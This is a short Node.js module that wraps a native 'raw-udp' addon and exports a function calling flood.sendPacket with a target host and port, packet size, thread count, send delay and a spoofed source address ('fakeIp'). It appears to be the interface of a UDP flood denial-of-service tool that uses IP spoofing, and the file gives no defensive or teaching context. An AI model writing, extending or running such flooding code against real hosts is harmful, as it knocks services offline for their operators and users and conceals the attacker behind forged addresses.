const flood = require('bindings')('raw-udp');


module.exports = (host, port, timeout, delay, packetSize, threads, fakeIp) => {
    flood.sendPacket(host, port, timeout, delay, packetSize, threads, fakeIp);
};